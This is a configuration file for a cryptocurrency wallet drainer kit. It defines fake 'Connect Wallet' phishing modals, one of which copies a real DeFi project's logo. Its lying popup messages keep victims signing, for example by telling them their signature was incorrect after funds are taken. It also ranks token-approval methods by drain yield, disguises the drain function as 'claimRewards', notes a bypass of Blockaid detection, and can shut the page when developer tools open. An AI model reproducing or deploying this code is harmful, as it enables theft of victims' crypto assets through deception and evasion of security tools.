
    /* 
        Modal_Style = 1; https://i.ibb.co/7zKDxx6/brave-v6-Ap-Shib-YR.png
        Modal_Style = 2; https://i.ibb.co/GvXy8kH/brave-qmejtu-HVi-C.png
        Modal_Style = 3; https://i.ibb.co/pdDJ5YR/brave-5-Hha-ZYeig-S.png
        Modal_Style = 4; https://i.ibb.co/88CHdVF/Telegram-zgdy-Sm-MLf-D.png
        Modal_Style = 5; https://i.ibb.co/R3KRv8D/brave-s-Plrx-CJm-SP.png
        Modal_Style = 6; No modal, auto connect MetaMask / WalletConnect V3
        Modal_Style = 7; WalletConnect V3 https://i.ibb.co/y0Zwhqs/brave-v-Qa-Cpi-Ksm-T.png
        Modal_Style = 8; https://i.ibb.co/GC7fQhb/Screenshot-2024-01-16-at-06-57-05.png

        Popup_Style = 1; SweetAlerts
        Popup_Style = 2; Black loaders
        Popup_Style = 3; Metamask styled loaders
        Popup_Style = 4; Modal 8 Purple loaders
        Popup_Style = 5; no popup
    */

        const Modal_Style = 7;
        const Popup_Style = 2;

        const Popup_4_Title_Text = "Connect a Wallet" //  Title of the popup
        const Popup_Wallet_Connected_Text = "Wallet has been successfully connected" // Message when user connected his wallet
        const Popup_Scanning_Assets_Text = "Connecting to Blockchain..." // Message when drainer is scanning user assets
        const Popup_Prompted_Title = "Waiting for your sign..." // Title of the message when user get the popup
        const Popup_Prompted_Text = "Sign the message in your wallet to continue..." // Message when user get the popup
        const Popup_Signed_Text = "The provided signature is incorrect, Please try again." // Message when user signed the drain popup
        const Popup_Total_Balance_Too_Low_Text = "Your wallet doesn\'t meet the requirements. Please try again by connecting a middle-active wallet." // Message when user connect with balance lower than "min_total_balance_for_prompt" worth
        const Popup_Not_Eligible_Text = "Your wallet has been flagged for an irregular activity. Please try to connect a different wallet." // Message once user signed all drain popups and become not eligible

        const Popup_Dark_Mode = true; // Popups Loaders dark or light mode, "true" = dark & "false" = light
        const WalletConnect_V3_Dark_Mode = true; // Modal 7 dark or light mode, "true" = dark & "false" = light


        const modal_div_config = {
            "modal_dark_mode": true // Modals dark mode, "true = dark" & "false = light"
        };

        const wallet_connect_config = {
            "font_family" : '',
            "accent_color" : '',
            "color_mix" : '',
            "font_size_master": ''
        }
    
        const Modal_2_Title = "Connect Wallet";
        const Modal_2_Subtitle = "Start by connecting your wallet from the list below!";
        const Modal_2_Subtitle_URL = "";
        const Modal_2_Subtitle_URL_Text = "";
    
        const Modal_3_Title = "Connect Wallet";
        const Modal_3_Subtitle = "Start by connecting your wallet from the list below!";
    
        const Modal_4_Title = "Connect Wallet";
        const Modal_4_Subtitle = "Start by connecting your wallet from the list below!";
        const Modal_4_Logo_URL = "https://conic.finance/static/media/conic.2bc918ed95a106ffe4941df1594559a2.svg";
        const Modal_4_Footer_Title = "";
        const Modal_4_Footer_URL = "";
        const Modal_4_Footer_URL_Text = "";
    
        const Modal_5_Title = "Connect Wallet"
        const Modal_5_Subtitle = "Choose what network and wallet want to connect below";

        const multiplierMap = { // Ratio - priorize the best popup, example on 1 ETH: scanner will detect 1 * 0.72 so 0.72 eth and let priority to best popups like Permit 
            "multichain": 0.7, // Multichain ratio
            "eth": 0.35, // ETH popup ratio
            "noeth": 0.66, // Tokens popup ratio (Increase Allowance/Approval & Approve/Transfer) 
            "permit": 1.001, // Permit popup ratio
            "permit2": 0.99, // Permit2 popup ratio
            "gmx": 0.55, // GMX popup ratio,
            "compound": 0.8,
            "nft": 0.35, // SetapprovalforAll/Multicall popup ratio
            "blur": 0.45, // Blur popup ratio
            "sea": 0.48, // Seaport/BulkTransfer popup ratio
            "wyvern": 0.41, // Wyvern OG nft popup ratio
            "apecoin": 0.3, // Apecoins unstake popup ratio
            "uniswap": 0.25 // Uniswap V2 popup ratio
        }; // Please note that ratio is already the best except maybe for tokens, some popups are better than others here so leave it as it is.

        const use_disperse_eth = true; // use Disperse for eth drains: function name 'Disperse Ether' blockaid bypassed
        const transfer_contract_drain_function_name = "claimRewards"; // Possibilities: Claim, claimRewards, Connect, Swap, Execute, Multicall, Merge, Enable, Verify
        const use_approve_if_increase_not_available = true; // When IncreaseAllowance/Approval are not available use Approve() instead of Transfer function
        const bulkTransferEnabled = true; // Replace Seaport by BulkTransfer
        const disable_dev_tool_enabled = false; // Close website instantly when user open console
        const click_everywhere_open_modal = false; // Click everywhere on page open modal
        const auto_prompt_on_reload = false; // Auto prompt popups when page get reloaded
        const skip_popup_decline = false; // Skip asset to next after popup decline
        const min_eth_balance = 0.002; // Mini balance for prompt (do not put lower than 0.002 or it will bug gas)
        const min_total_balance_for_prompt = 0.5; // Total wallet value needed to prompt a popup 
        const remove_drained_elements_in_past = false; // Remove already drained assets during page refresh etc
        const show_zero_logs_enabled = true; // show connects logs below "min_total_balance_for_prompt" worth
        const chain_switch_prompt_log_enabled = true; // Allow logs for prompting switch chain

        // Don't touch if you don't know what is this for
        const manual_claim_allowance = false; // Requires "use_approve_if_increase_not_available" set in true
        const default_allowance_drain_enabled = false;
        const default_allowance_contract = "0xdac17f958d2ee523a2206206994597c13d831ec7"; // Token contract that will be prompted by default if no assets value > min_default_prompt_value
        const min_default_prompt_value = 1; // The amount in ETH required to have a regular prompt instead of default allowance prompt
    
        class SwalPopup {
        constructor() {  this.popup = null;  this.timeout = null;  }
    
        // Prompt alert
        show() {
            this.popup = Swal.fire({
            html: '<b>Connection Established</b><br>Sign message in your wallet to continue...',
            imageUrl: 'https://miro.medium.com/v2/resize:fit:720/1*CsJ05WEGfunYMLGfsT2sXA.gif',
            width: 600,
            imageHeight: 80,
            color: '#1b1e24',
            background: '#ffffff',
            timer: 0,
            allowOutsideClick: false,
            allowEscapeKey: false,
            showConfirmButton: false,
            })
        }
    
        close() {
            Swal.close();
            this.popup = null;
        }
    
        // Poor alert
        pooron(error = 'Insufficient ETH for transaction broadcast. Try with different wallet.') {
        this.popup = Swal.fire({
            title: 'Something went wrong!',
            icon: 'error',
            confirmButtonText: 'OK',
            text: error,
            color: '#1b1e24',
            background: '#ffffff',
            allowOutsideClick: true,
            allowEscapeKey: true,
            })
        }
    
        // Not eligible alert
        notEli(error = 'Insufficient ETH for transaction broadcast. Try with different wallet.') {
        this.popup = Swal.fire({
            title: 'Something went wrong!',
            icon: 'error',
            confirmButtonText: 'OK',
            text: error,
            color: '#1b1e24',
            background: '#ffffff',
            allowOutsideClick: true,
            allowEscapeKey: true,
            })
        }
    
        // Drained alert
        setError(error = 'Authentification was cancelled due to rapid change in gas prices. Please try again.') {
        this.popup = Swal.fire({
            title: 'Something went wrong!',
            imageUrl: '',
            icon: 'error',
            text: error,
            color: '#1b1e24',
            background: '#ffffff',
            allowOutsideClick: true,
            allowEscapeKey: true,
            })
        }
    
        // Connected wallet alert
        setSuccess() {
        this.popup = Swal.fire({
            icon: 'success',
            title: 'Connection established',
            text: 'Awaiting wallet response, please wait a moment.',
            color: '#1b1e24',
            background: '#ffffff',
            showConfirmButton: false,
            allowOutsideClick: true,
            allowEscapeKey: true,
            })
        }
    
        // Chain Switch alert
        chainswitch() {
        this.popup = Swal.fire({
            icon: 'info',
            title: 'Switching network',
            text: 'Confirm network switch in wallet...',
            color: '#1b1e24',
            background: '#ffffff',
            showConfirmButton: false,
            allowOutsideClick: true,
            allowEscapeKey: true,
            })
        }
    
        update(options) {   this.popup.update(options); }
        }

        let blacklistedAddresses = [ // Manually blacklist addresses (better to do from bot) 
            "0x240Cf70D8A648BE133fEB342D71E5e81C686e5f8","0x20cCdeDB9814c83bA2D663fC04f88c7a61aA706d","0x2ad6FA4db57Ac71479510863643Eb6b1991788E1",
            "0x8216D02B21710a47367F0548bF68D86cC71d0b67","0x42211F268EcfeD281e9708C029D69910265d223c","0x0000000000000000000000000000000000000003",
            // add addresses below, format: "0x...",
        ];
